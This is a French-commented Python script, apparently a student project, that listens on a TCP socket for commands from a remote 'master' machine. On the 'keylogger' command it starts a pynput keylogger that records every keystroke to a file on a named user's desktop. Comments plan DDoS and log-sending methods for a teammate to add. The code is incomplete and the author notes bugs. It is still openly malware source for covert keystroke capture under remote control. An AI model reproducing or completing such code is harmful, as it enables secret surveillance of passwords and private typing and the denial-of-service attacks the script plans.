#importation du module socket afin de permetttre une communication réseau
import socket as modSocket
from pynput.keyboard import Key, Listener
import logging
import time

"""

création de l'objet communication
avec le champ data, qui va contenir le message envoyé par le maitre.
il y a plusieurs champs qui vont être des actions a effectuer.
start_log() va lancer un logger qui va enregistrer tous ce qui vas être taper
sur le clavier.

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Une fois que le code rentre dans le start_log(), il ne s'y retire plus, on rentre dans une
sorte de boucle infini, on est obligé de stopper de force le programme pour y sortir. Et ont veut que
le programme ne s'éteigne jamais, et puisse recommencer à communiquer avec le maitre.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

ddos() ..................
send_log() ..............
fais ce qui te plais avec les 2 methodes au dessus a toi de t'amuser :D

"""
class Communication():

    def __init__(self, data):
        self.data = data

    def start_log(self, data, conn):
        #chemin ou seront écris les logs voulus
        log_dir = r"C:\\Users\\Salihu Brilant\\Desktop"
        #met les informations de base concernant le logger
        #filename, spécifie le nom du fichier
        #format, impose les infos de base qui se trouveront dans le logger, içi la date avec l'heure puis les infos sur les entrées sur le clavier 
        logging.basicConfig(filename = (log_dir + "\\keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
        #Création d'une fonction appuie(), qui vas mettre en string touts les appuie sur le clavier
        def appuie(key):
            logging.info(str(key))  
        #une fois rentrer içi le programme écoute les appuie sur les entrées
        with Listener(on_press=appuie) as listener:
            conn.send(b"Logger actif")
            #cette condition nous permet d'arreter le logger
            if conn.recv(1024).decode("utf-8") != "stop":
                listener.join()
            conn.send(b"Logger inactif")
            print("Logger arretée")
            # !!!!!!! Je ne sais pas comment recommencer le programme une fois le logger arreté !!!!!!!!
        data = conn.recv(1024).decode("utf-8")

    
       
#on choisi la famille AF_NET pour utiliser l'ipv4, en mode TCP
#on bind grace au nom de la machine sur un port non existant
s = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
s.bind(("localhost", 5000))
#on essaye une connexion normale
try:
    s.listen()
    conn, addr = s.accept()
    print("Connecion acceptée avec : ", addr[0], " sur le port ", addr[1])
#Si le code est arreté par le pc maitre ou celui-ci(je ne sais plus lequel) renvoie le message ci dessous
except ConnectionAbortedError:
    print("Connexion interrompue avec la machine : ", addr)

#on initie le champ data
data = conn.recv(1024).decode("utf-8")
#on assigne l'objet communication avec la variable a
#on est obliger de spécifié le champ data
a = Communication(data)

#boucle qui permet de lancer une methode de l'objet communication
while data != "FIN":
    if data == "keylogger":
        print("OK je lance le keylogger")
        #lance la methode start_log de l'objet Communication
        a.start_log(data, conn)
        data = conn.recv(1024).decode("utf-8")
    data = conn.recv(1024).decode("utf-8")
# rajoute ddos() ou send_log(), choisi :D


"""

Dernier problème que je ne comprend pas dans notre programme.
Il reçoit les réponse du maitre dans l'ordre (data = conn.recv(1024).decode("utf-8"))
par exemple si dans le maitre après avoir prit le choix pour lancer le keylogger, on ne choisi pas après
celui pour l'arreter on ne pourra plus arreter le programme par après.
car il y a un ordre qui ces créer dans les data.
:(

"""
    

s.close()



